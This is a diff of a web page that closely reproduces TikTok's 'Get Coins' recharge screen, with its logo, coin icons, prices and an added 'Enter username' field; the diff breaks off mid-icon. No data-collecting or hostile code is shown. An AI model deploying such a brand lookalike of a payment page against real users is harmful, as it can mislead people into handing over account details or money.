@@ -15,7 +15,7 @@
             tiktok: {
               primary: '#000000',
               secondary: '#262626',
-              accent: '#FE2C55', // TikTok Red
+              accent: '#FE2C55', // TikTok红
               light: '#F7F7F7',
               gray: '#E5E5E5',
               'gray-dark': '#999999',
@@ -35,26 +35,59 @@
   </script>
   
   <style>
-    /* Base Styles */
+    /* 基础样式 */
     body {
       font-family: 'Inter', Helvetica, Arial, sans-serif;
       background-color: #FAFAFA;
+      transition: padding-top 0.3s ease-out;
+    }
+    
+    /* 当导航栏出现时，给body增加上边距 */
+    body.body-with-header {
+      padding-top: 6.5rem; /* 2.5rem (安全横幅) + 4rem (主导航栏) */
+    }
+    
+    /* 动态文本下划线效果 */
+    #user-input {
+      text-decoration: none;
+    }
+    #user-input:not(:placeholder-shown) {
+      text-decoration: underline dotted #f472b6 2px;
+      text-underline-offset: 4px;
     }
 
-    /* Slide-up/down transition for the custom panel */
+    /* 底部固定按钮 */
+    .fixed-bottom-btn {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      z-index: 50;
+      padding: 1rem;
+      background-color: #fff;
+      border-top: 1px solid #eee;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
+    }
+
+    /* 为了在有底部按钮时，页面内容不被遮挡 */
+    main.with-bottom-bar {
+        margin-bottom: 140px;
+    }
+
+    /* 自定义弹窗面板的滑入滑出效果 */
     #custom-coin-panel {
         transition: transform 0.3s ease-in-out;
     }
     
-    /* Active state for the recharge button */
+    /* 激活状态的充值按钮 */
     .recharge-button.active {
-        background-color: #FE2C55; /* TikTok Red */
+        background-color: #FE2C55;
         cursor: pointer;
     }
     
-    /* Inactive state for the recharge button */
+    /* 未激活状态的充值按钮 */
     .recharge-button {
-        background-color: #fddde4; /* Light Pink */
+        background-color: #fddde4;
         cursor: not-allowed;
     }
   </style>
@@ -62,9 +95,54 @@
 
 <body class="text-tiktok-primary bg-[#FAFAFA] min-h-screen">
 
-  <main class="container mx-auto px-4 py-6 max-w-md">
-    <div class="bg-white rounded-xl p-4 md:p-6">
+  <div class="fixed top-0 left-0 right-0 z-50 bg-white border-b border-gray-200 h-10 flex items-center px-4 sm:px-6">
+    <div class="flex items-center gap-2 text-base text-gray-800 font-semibold">
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-gray-600">
+        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
+      </svg>
+      <span>Get Coins</span>
+    </div>
+  </div>
+
+
+  <header id="popup-header" class="fixed top-10 left-0 right-0 z-40 bg-white border-b border-gray-200 shadow-sm transition-transform duration-300 ease-out -translate-y-full">
+    <div class="container mx-auto px-4 h-16 flex items-center justify-between gap-2 sm:gap-4">
+      <div class="flex items-center flex-shrink-0">
+         <svg class="w-auto h-8" viewBox="0 0 118 42" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
+      </div>
+      
+      <div class="flex-1 min-w-0 mx-2">
+        <div class="relative">
+          <input type="text" placeholder="Search" 
+                 class="w-full bg-gray-100 rounded-full py-2 px-4 pl-10 text-sm focus:outline-none focus:ring-1 focus:ring-tiktok-accent/50">
+          <i class="fas fa-search absolute left-4 top-1/2 transform -translate-y-1_2 text-gray-400 text-sm"></i>
+        </div>
+      </div>
+      
+      <div class="flex items-center space-x-2 sm:space-x-4 flex-shrink-0">
+        <button class="bg-tiktok-accent text-white font-semibold px-4 sm:px-6 py-2 rounded-md transition hover:bg-red-600">Log in</button>
+        <button class="text-gray-800 text-xl hover:text-black transition"><i class="fas fa-ellipsis-v"></i></button>
+      </div>
+    </div>
+  </header>
+
+
+  <main class="container mx-auto px-4 py-6 with-bottom-bar">
+    <div class="bg-white rounded-xl shadow-tiktok p-4 md:p-6 max-w-md mx-auto">
       <div class="flex-1 min-w-0">
+        <div class="flex items-center justify-between gap-4 mb-6">
+          <h1 class="text-2xl font-bold flex-shrink-0">Get Coins</h1>
+          <a href="#" class="text-sm font-semibold text-gray-700 hover:text-tiktok-accent transition whitespace-nowrap">View transaction history</a>
+        </div>
+        
+        <div class="relative mb-6">
+          <input type="text" id="user-input" placeholder="Enter username" 
+                 class="w-full bg-gray-100 rounded-lg py-3 px-5 text-base focus:outline-none">
+          <button id="clear-input-btn" class="absolute right-4 top-1/2 transform -translate-y-1_2 text-gray-400 hover:text-gray-600 hidden">
+            <i class="fas fa-times-circle"></i>
+          </button>
+        </div>
+
         <div class="mb-4">
             <h2 class="text-xl font-bold text-black mb-1">Recharge</h2>
             <p class="text-sm text-tiktok-accent flex items-center">
@@ -73,194 +151,29 @@
             </p>
         </div>
       
-        <div>
-            <div class="grid grid-cols-3 gap-3" id="coin-options-grid">
-              <div class="coin-option bg-tiktok-accent/10 border-2 border-tiktok-accent rounded-lg p-4 cursor-pointer" data-price="0.29" data-coins="30">
+        <div class="mb-8">
+            <div class="grid grid-cols-2 sm:grid-cols-3 gap-3" id="coin-options-grid">
+              <div class="coin-option bg-tiktok-accent/10 border-2 border-tiktok-accent rounded-lg p-4 cursor-pointer shadow-tiktok-hover" data-price="0.29" data-coins="30">
                 <div class="flex items-center justify-center mb-1 gap-1">
+                  <svg class="block w-5 h-5" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__a)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__a"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
                   <span class="font-bold">30</span>
                 </div>
                 <p class="text-center text-sm font-medium">£0.29</p>
               </div>
-              <div class="coin-option bg-white border border-gray-200 rounded-lg p-4 cursor-pointer" data-price="3.30" data-coins="350">
+              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover" data-price="3.30" data-coins="350">
                 <div class="flex items-center justify-center mb-1 gap-1">
+                  <svg class="block w-5 h-5" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__a)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__a"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
                   <span class="font-bold">350</span>
                 </div>
                 <p class="text-center text-sm font-medium">£3.30</p>
               </div>
-              <div class="coin-option bg-white border border-gray-200 rounded-lg p-4 cursor-pointer" data-price="6.59" data-coins="700">
+              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover" data-price="6.59" data-coins="700">
                 <div class="flex items-center justify-center mb-1 gap-1">
+                  <svg class="block w-5 h-5" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__a)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__a"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
                   <span class="font-bold">700</span>
                 </div>
                 <p class="text-center text-sm font-medium">£6.59</p>
               </div>
-              <div class="coin-option bg-white border border-gray-200 rounded-lg p-4 cursor-pointer" data-price="65.85" data-coins="7,000">
+              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover" data-price="65.85" data-coins="7,000">
                 <div class="flex items-center justify-center mb-1 gap-1">
-                  <span class="font-bold">7,000</span>
-                </div>
-                <p class="text-center text-sm font-medium">£65.85</p>
-              </div>
-              <div class="coin-option bg-white border border-gray-200 rounded-lg p-4 cursor-pointer" data-price="164.55" data-coins="17,500">
-                <div class="flex items-center justify-center mb-1 gap-1">
-                  <span class="font-bold">17,500</span>
-                </div>
-                <p class="text-center text-sm font-medium">£164.55</p>
-              </div>
-              <div id="custom-btn" class="coin-option bg-white border border-gray-200 rounded-lg p-4 cursor-pointer" data-price="0" data-coins="Custom">
-                <div class="flex flex-col items-center justify-center h-full">
-                  <span class="font-bold text-base">Custom</span>
-                </div>
-              </div>
-            </div>
-        </div>
-      </div>
-    </div>
-  </main>
-  
-  <div id="custom-coin-modal" class="fixed inset-0 bg-black/60 z-50 hidden">
-    <div id="custom-coin-panel" class="absolute bottom-0 left-0 right-0 bg-white rounded-t-2xl p-4 transform translate-y-full">
-        <div class="flex items-center justify-between mb-4">
-            <button id="modal-back-btn" class="text-xl text-gray-600"><i class="fas fa-arrow-left"></i></button>
-            <h3 class="text-lg font-bold">Custom</h3>
-            <button class="text-xl text-gray-600"><i class="fas fa-question-circle"></i></button>
-        </div>
-
-        <div class="mb-4">
-            <label class="text-sm font-bold text-gray-700 flex items-center mb-2">Number of Coins <i class="fas fa-chevron-down text-xs ml-1"></i></label>
-            <div class="relative">
-                <div class="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
-                    <svg class="w-5 h-5" font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__a)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__a"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
-                    <div id="cursor-line" class="w-0.5 h-5 bg-red-500 ml-1"></div>
-                </div>
-                <input type="text" id="custom-amount-input" readonly class="w-full bg-gray-100 rounded-lg py-3 pl-10 pr-4 text-gray-400 text-lg" placeholder="30 - 2,500,000">
-            </div>
-        </div>
-
-        <div class="text-sm text-gray-500 mb-4 flex items-center">
-            Recently picked
-            <svg class="w-4 h-4 mx-1" font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__a)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__a"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
-            <span>30</span>
-        </div>
-
-        <div id="keypad" class="grid grid-cols-4 gap-3 text-center mb-4">
-            <button data-key="1" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">1</button>
-            <button data-key="2" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">2</button>
-            <button data-key="3" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">3</button>
-            <button data-key="backspace" class="bg-gray-100 rounded-lg py-3 text-xl active:bg-gray-200"><i class="fas fa-backspace"></i></button>
-            <button data-key="4" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">4</button>
-            <button data-key="5" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">5</button>
-            <button data-key="6" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">6</button>
-            <button data-key="000" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">000</button>
-            <button data-key="7" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">7</button>
-            <button data-key="8" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">8</button>
-            <button data-key="9" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">9</button>
-            <button data-key="0" class="bg-gray-100 rounded-lg py-3 text-xl font-semibold active:bg-gray-200">0</button>
-        </div>
-
-        <div class="border-t pt-4">
-             <div class="flex items-center justify-between text-sm mb-2 cursor-pointer">
-                <p class="font-semibold text-gray-700">Special offer</p>
-                <div class="flex items-center gap-2">
-                    <p class="text-gray-500">Add to home screen to apply</p>
-                    <i class="fas fa-chevron-right text-gray-400 text-xs"></i>
-                </div>
-            </div>
-            <div class="flex items-center justify-between font-bold text-lg mb-4">
-                <span>Total</span>
-                <span id="total-price">£0</span>
-            </div>
-            <button id="modal-recharge-btn" class="recharge-button w-full text-white font-bold py-3 rounded-full transition flex items-center justify-center">
-                <svg class="mr-2" fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em"><path d="M28.22 13.7a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.97 2.97 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z"></path><path d="M5 23.15V10.5c0-1.2 1.06-2.17 2.26-2.28 3.05-.25 8.87-1.52 15.34-6.99.8-.67 2-.67 2.8 0 6.46 5.46 12.28 6.74 15.34 7 1.2.1 2.26 1.07 2.26 2.27v12.65c0 14.13-14.77 21.8-18.27 23.43-.47.22-1 .22-1.47 0C19.76 44.96 5 37.28 5 23.15Zm4-11.1v11.1c0 5.57 2.88 10.04 6.56 13.5 3.1 2.91 6.5 4.86 8.44 5.85a37.07 37.07 0 0 0 8.43-5.85C36.11 33.2 39 28.72 39 23.15V12.04c-3.65-.53-9.1-2.16-15-6.8-5.91 4.64-11.35 6.27-15 6.8Z"></path></svg>
-                Recharge
-            </button>
-        </div>
-    </div>
-  </div>
-  
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const customBtn = document.getElementById('custom-btn');
-      const customCoinModal = document.getElementById('custom-coin-modal');
-      const customCoinPanel = document.getElementById('custom-coin-panel');
-      const modalBackBtn = document.getElementById('modal-back-btn');
-      const keypad = document.getElementById('keypad');
-      const amountInput = document.getElementById('custom-amount-input');
-      const totalPriceEl = document.getElementById('total-price');
-      const modalRechargeBtn = document.getElementById('modal-recharge-btn');
-
-      // --- Modal Show/Hide Logic ---
-      function showModal() {
-        customCoinModal.classList.remove('hidden');
-        setTimeout(() => {
-            customCoinPanel.classList.remove('translate-y-full');
-        }, 10);
-      }
-
-      function hideModal() {
-        customCoinPanel.classList.add('translate-y-full');
-        setTimeout(() => {
-            customCoinModal.classList.add('hidden');
-            amountInput.value = '';
-            updateState(); 
-        }, 300);
-      }
-
-      customBtn.addEventListener('click', showModal);
-      modalBackBtn.addEventListener('click', hideModal);
-      customCoinModal.addEventListener('click', (e) => {
-        if (e.target === customCoinModal) {
-            hideModal();
-        }
-      });
-
-
-      // --- Keypad Input & State Update Logic ---
-      keypad.addEventListener('click', (e) => {
-        const key = e.target.closest('button')?.dataset.key;
-        if (!key) return;
-
-        let currentValue = amountInput.value;
-
-        if (key === 'backspace') {
-            currentValue = currentValue.slice(0, -1);
-        } else {
-            currentValue += key;
-        }
-        
-        if (currentValue.length > 7) {
-            currentValue = currentValue.slice(0, 7);
-        }
-
-        amountInput.value = currentValue;
-        updateState();
-      });
-      
-      // --- Central function to update UI state ---
-      function updateState() {
-          const value = amountInput.value;
-          const amount = parseInt(value, 10);
-          
-          if (value) {
-              amountInput.classList.remove('text-gray-400');
-              amountInput.classList.add('text-black', 'font-semibold');
-          } else {
-              amountInput.classList.remove('text-black', 'font-semibold');
-              amountInput.classList.add('text-gray-400');
-          }
-
-          // Price simulation (approx. £0.29 per 30 coins)
-          const price = isNaN(amount) ? 0 : (amount / 30) * 0.29;
-          totalPriceEl.textContent = `£${price.toFixed(2)}`;
-
-          // Update recharge button state
-          if (!isNaN(amount) && amount >= 30 && amount <= 2500000) {
-              modalRechargeBtn.classList.add('active');
-              modalRechargeBtn.disabled = false;
-          } else {
-              modalRechargeBtn.classList.remove('active');
-              modalRechargeBtn.disabled = true;
-          }
-      }
-    });
-  </script>
-</body>
-</html>
+                  <svg class="block w-5 h-5" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__a)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" f
